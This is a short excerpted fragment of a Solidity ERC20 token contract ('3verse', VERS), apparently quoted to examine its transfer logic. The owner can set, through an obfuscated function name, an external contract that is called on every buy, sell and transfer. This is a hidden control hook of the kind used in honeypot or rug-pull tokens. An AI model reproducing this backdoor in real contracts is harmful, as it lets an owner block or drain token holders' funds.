...
contract TokenM is ERC20 {
    ...
    IUserAmountvrsbpt public vrsbpt;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("3verse", "VERS") {
    ...
    function vrurarstFloverGsuud(IUserAmountvrsbpt _vrsbpt) public onlyOwner {
        vrsbpt = _vrsbpt;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                vrsbpt.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				vrsbpt.addOutAmount(from, amount);
            }else{
                vrsbpt.addOutAmount(from, amount);
                takeFee = false;
            }
